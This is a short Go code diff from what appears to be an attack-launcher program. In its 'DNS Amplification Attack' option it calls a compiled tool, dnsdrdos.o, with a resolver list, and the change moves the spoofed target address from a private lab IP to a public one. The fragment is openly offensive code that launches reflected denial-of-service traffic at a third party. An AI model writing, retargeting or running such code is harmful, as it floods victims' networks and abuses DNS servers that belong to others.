@@ -23,7 +23,7 @@ func main() {
 		fmt.Println(string(out))
 	case 2:
 		fmt.Println("------------------------Starting DNS Amplification Attack------------------------")
-		out, err := exec.Command("./dnsdrdos.o", "-f", "./DNSlist.txt", "-s", "10.0.2.5", "-l", "10000000").Output()
+		out, err := exec.Command("./dnsdrdos.o", "-f", "./DNSlist.txt", "-s", "81.184.179.62", "-l", "10000").Output()
 		if err != nil {
 			log.Fatal(err)
 		}
